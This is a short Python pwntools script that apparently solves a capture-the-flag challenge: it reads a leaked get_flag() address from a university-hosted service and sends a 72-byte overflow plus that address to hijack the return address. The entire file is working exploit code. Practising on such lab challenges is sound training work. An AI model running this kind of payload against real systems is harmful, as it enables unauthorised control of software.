from pwn import *

port = 10032
rem = remote("kayle.snu.ac.kr", port)

rem.recvuntil(b"get_flag() : 0x")
flag_addr = int(rem.recvn(6).decode(), 16)

rem.sendlineafter(b"username: ", b"A")

payload = b'A' * 72 + p64(flag_addr)
rem.sendlineafter(b"back? ", payload)

rem.recvline()
print(rem.recvall())